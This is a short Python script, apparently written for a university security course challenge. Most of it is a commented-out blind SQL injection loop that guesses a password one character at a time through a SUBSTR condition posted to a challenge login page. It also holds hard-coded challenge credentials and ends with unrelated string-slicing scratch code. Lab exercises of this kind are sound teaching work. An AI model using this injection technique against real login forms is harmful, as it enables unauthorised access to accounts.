from string import ascii_lowercase
import requests

# Create a dictionary containing the form elements and their values
data = {"pid": "A15753240", "entry_password": "DoI7SazBUjgmhTLP",
        "password": "SUPERPAYLOADINSERTHERE"}

# for c in ascii_lowercase:
#     print("Trying character ", c)
#     #update password
#     CC = c
#     superPayload = f"pp' OR SUBSTR(password, 8, 1) = '{CC}'); --"
#     data["password"] = superPayload
#     # POST to the remote endpoint. The Requests library will encode the
#     # data automatically
#     r = requests.post("https://c10-32.sysnet.ucsd.edu/challenges/level8_password/",
#                       data=data)
#
#
#     # Get the raw body text back
#     body_data = r.text
#     #print(body_data)
#
#     if body_data.find("<p>success</p>") != -1:
#         print("SUCCESS")
#     else:
#         print("FAILURE")

i = 2
word = "fook me"
child=word[:i]+word[i+1:]
print(child)